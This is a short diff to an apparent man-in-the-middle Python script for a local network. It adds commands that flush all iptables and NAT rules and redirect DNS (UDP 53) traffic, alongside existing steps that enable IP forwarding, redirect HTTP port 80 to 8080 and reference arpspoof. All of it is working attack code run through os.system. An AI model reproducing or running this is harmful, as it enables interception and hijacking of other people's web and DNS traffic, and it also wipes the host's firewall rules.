@@ -66,9 +66,11 @@ gateway_ip = (get_default_gateway_linux())
 
 #os commands
 
+flush = "iptables --flush"
+flush_nat = "iptables --flush -t nat"
 traffic_on = "echo 1 > /proc/sys/net/ipv4/ip_forward"
 traffic_redirect = "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"
-
+traffic_redirect2 = "iptables -t nat -A PREROUTING -p udp --destination-port 53 -j  REDIRECT --to-port 53"
 
 #arpspoof_interface = """"arpspoof -i """
 #arpspoof_target = " -t "
@@ -146,12 +148,14 @@ try:
 		sleep(0.5)
 		print ("\n{0}[{1}+{0}]{2}Redirecting traffic... ").format(WHITE , RED , Cafe)
 		sleep(1.2)
+		os.system(flush)
+		os.system(flush_nat)
 		os.system (traffic_on)
 		
 		print ("\n{0}[{1}+{0}]{2}Directing traffic to port 8080 ... ").format(WHITE , RED , Cafe)
 		sleep(2.2)
 		os.system (traffic_redirect)
-		
+		os.system (traffic_redirect2)
 		print ("\n{0}[{1}+{0}]{1}Done").format(WHITE , OKGREEN)
 		
 		sleep(0.5)
